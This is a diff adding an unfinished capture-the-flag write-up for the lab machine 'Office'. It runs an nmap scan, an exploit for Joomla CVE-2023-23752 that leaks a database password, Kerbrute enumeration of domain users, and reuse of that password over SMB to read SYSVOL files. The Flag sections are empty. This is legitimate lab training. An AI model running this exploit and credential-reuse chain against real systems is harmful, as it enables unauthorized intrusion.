@@ -372,3 +372,117 @@ print (output)
         -----END OPENSSH PRIVATE KEY-----
         ```
 
+## Office
+
+### Reco
+
+#### nmap
+
+`sudo nmap -sVC 10.10.11.3`
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* obtained info
+  * 53 DNS
+  * 80 HTTP (Joomla) - /administrator /logs /plugins /installation
+  * 88 Kerberos
+  * 443 HTTPS
+  * 445 Microsoft DS
+  * 464 Kpasswd5?
+  * 593 RPC over HTTP
+  * 3268+3269 LDAP (AD) - office.htb0
+* no etc hosts update needed
+
+#### website
+
+* blog written by "Tony Stark" about Iron Man series & Holograms
+* /administrator
+  * default Joomla credentials
+    * admin:\<none>
+    * joomla:secret
+    * joomla2:secret
+  * none of above working...
+* **JOOMLA v4.2.7**&#x20;
+  * CVE-2023-23752
+    * improper access check allows unauth access to webservice endpoints...
+
+### Weaponisation
+
+#### Joomla Exploit
+
+* find Exploit for CVE above and clone it
+  * git clone [https://github.com/Acceis/exploit-CVE-2023-23752.git](https://github.com/Acceis/exploit-CVE-2023-23752.git)
+  * cd exploit
+  * ruby exploit.rb http://10.10.11.3
+    * User: 474 Tony Stark (admin)
+      * Administrator@holography.htb
+      * Super Users
+    * Editor: tinymce
+    * DB info:
+      * type: mysqli
+      * name: joomla\_db
+      * **root:H0lOgrams4reTakIng0Ver754!**
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+* OK, we obtained access to DB, but first we have to gain backend access...
+
+#### Bruteforcing Kerberos
+
+* tool: Kerbrute
+
+```bash
+git clone https://github.com/ropnop/kerbrute.git
+cd kerbrute
+make all
+cd dist
+./kerbrute_linux_amd64 userenum --dc 10.10.11.3 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+* obtained info:
+  * usernames:
+    * administrator@office.htb
+    * ewhite@office.htb
+    * etower@office.htb
+    * dwolfe@office.htb
+    * dlanor@office.htb
+    * dmichael@office.htb
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation
+
+* i didnt know what to do next with obtained credentials...
+* so I decided to try combinations for few login possibilities
+  * SMB was working
+
+#### smbclient
+
+```bash
+#login & list shares
+smbclient -L //10.10.11.3 -U dwolfe@office.htb --password=H0lOgrams4reTakIng0Ver754!
+
+#list specific share...
+smbclient \\\\\10.10.11.3\\SYSVOL -U dwolfe@office.htb --password=H0lOgrams4reTakIng0Ver754!
+ls
+cd office.htb
+ls
+cd Policies
+
+#cd to all the 7 subdirs and download each GPT.INI file
+cd <folder>
+get GPT.INI
+```
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+* lets list these shares
+  *
+
+### User flag
+
+### Root flag
